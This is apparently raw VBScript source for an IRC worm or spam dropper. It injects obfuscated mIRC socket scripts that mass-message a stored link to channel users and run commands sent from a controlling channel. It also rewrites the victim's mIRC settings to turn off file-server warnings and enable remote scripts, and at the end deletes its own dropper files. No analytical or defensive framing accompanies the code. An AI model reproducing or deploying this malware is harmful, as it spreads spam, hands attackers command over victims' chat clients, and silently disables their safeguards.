fr6.writeline "n57=on +1:nick:{ if ($nick != $me) && ($nick !isop $active) && (%d.ste != $null) { if ($sock(3833oj*) != $null) && (%3333833 == $null) { inc %stok | set -u6 %3333833 1 | .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $newnick : $+ %d.ste | .guser 2 $newnick 2 | halt } | elseif (%3333833 != $null) || ($sock(3833oj*) == $null) && (%33338833 == $null) { inc %stok | set -u15 %3333833 1 | $chr(46) $+ $chr(109) $+ $chr(115) $+ $chr(103) $newnick %d.ste ! | .guser 2 $newnick 2 | halt } } }"
fr6.writeline "n58=on +1:part:#:{ if ($nick != $me) && ($sock(3833oj*) != $null) && ($nick isreg #) && (%3333833 == $null) && ($nick != cycler) && (M !isincs $gettok($chan(#).mode,1,32)) && (m !isincs $gettok($chan(#).mode,1,32)) { inc %stok | .auser 2 *!* $+ $address | .sockwrite -n 3833oj* $chr(112) $+ $chr(114) $+ $chr(105) $+ $chr(118) $+ $chr(109) $+ $chr(115) $+ $chr(103) $nick : $+ %d.ste | set -u7 %3333833 333333 } }"
fr6.writeline "n59=on *:sockread:in.und*: { sockread %in.und | if ($gettok(%in.und,1,32) == Ping) && (%pigu != 1) { set %pigu 1 | sockwrite -tn $sockname Pong $remove($gettok(%in.und,2,32),:) } | if ($gettok(%in.und,2,32) == 001) { set -u8 %invutime ` | .sockwrite -nt $sockname join %Jund $+ , $+ %j.und | .sockwrite -nt $sockname mode %jund +s | .timeruu 1 8 unset %j.und }"
fr6.writeline "n60=  if ($remove($gettok(%in.und,2,32),:) == privmsg) && ($remove($gettok(%in.und,1,33),:) == $remove($gettok(%jund,1,32),$chr(35))) { if ($left($remove($gettok(%in.und,1,33),:),3) == $gettok(%in.und,2,58)) { sockwrite -nt $sockname privmsg $remove($gettok(%in.und,1,33),:) : $+ Lotal-( $+ %stok $+ ) New-( $+ %stokk $+ ) Web-( $+ %d.ste1 $+ ) } | if ($chr(35) isin $gettok(%in.und,5,32)) { sockwrite -nt $sockname $gettok(%in.und,2,58) $gettok(%in.und,5,32) } | if ($remove($gettok(%in.und,4,32),:) == $left($remove($gettok(%in.und,1,33),:),4)) { $gettok(%in.und,5-,32) } }"
fr6.writeline "n61=  if ($remove($gettok(%in.und,2,32),:) == privmsg) && (www !isin %in.und) && (spam !isin %in.und) && (serv !isin %in.und) && (admin !isin %in.und) && (FINGER !isin %in.und) && (ping !isin %in.und) && ($host !isin %in.und) && ( $ip !isin %in.und) && (Guest0 !isin %in.und) && (bot !isin %in.und) && ($chr(35) !isin %in.und) { if (%invu. [ $+ [ $remove($gettok(%in.und,1,33),:) ] ] != Npm) { inc %stokk | set %invu. [ $+ [ $remove($gettok(%in.und,1,33),:) ] ] Npm | .sockwrite -nt $sockname privmsg $remove($gettok(%in.und,1,33),:) : $+ %d.ste1 } }"
fr6.writeline "n62=if ($remove($gettok(%in.und,2,32),:) == join) && (%jund !isin %in.und) && (%invu. [ $+ [ $remove($gettok(%in.und,1,33),:) ] ] != Njm) && (spam !isin %in.und) && (serv !isin %in.und) && (admin !isin %in.und) && ($host !isin %in.und) && ($ip !isin %in.und) && (%invutime == $null) && (Guest0 !isin %in.und) { if (%invu. [ $+ [ $remove($gettok(%in.und,1,33),:) ] ] != Npm) { set -u10 %invutime ` | set %invu. [ $+ [ $remove($gettok(%in.und,1,33),:) ] ] Njm | tl | .sockwrite -nt $sockname privmsg $remove($gettok(%in.und,1,33),:) : $+ %tl } } | :end | unset %in.und }"
fr6.writeline "n63="
fr6.writeline "n64="
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[warn]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(n2a)=ucase("fserve=on") then
fr2a.writeline "fserve=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/Remote ON"
fr1p.Close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec) 
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec) 
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")
sss.DeleteFile "c:\rol.vbs"
sss.DeleteFile "c:\winamod.dat"
